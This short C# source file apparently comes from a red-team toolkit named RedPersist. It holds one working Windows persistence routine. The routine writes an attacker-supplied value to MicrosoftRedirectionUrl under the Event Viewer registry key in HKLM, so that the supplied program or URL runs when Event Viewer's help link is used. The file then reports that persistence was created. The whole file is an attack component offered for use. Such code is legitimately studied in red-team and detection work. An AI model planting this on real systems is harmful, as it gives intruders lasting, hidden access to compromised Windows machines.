using Microsoft.Win32;
using System;
namespace RedPersist.Persist
{
 
    public class Eventviewer1
    {
        public static void Do(string[] args)
        {
            var hklm = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey key = hklm.OpenSubKey("SOFTWARE", true);
            key = key.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Event Viewer");
            key.SetValue("MicrosoftRedirectionUrl", args[1], RegistryValueKind.String);
            key.Close();
            Console.WriteLine("[*] Eventviewer Persistence created");
        }
    }
}
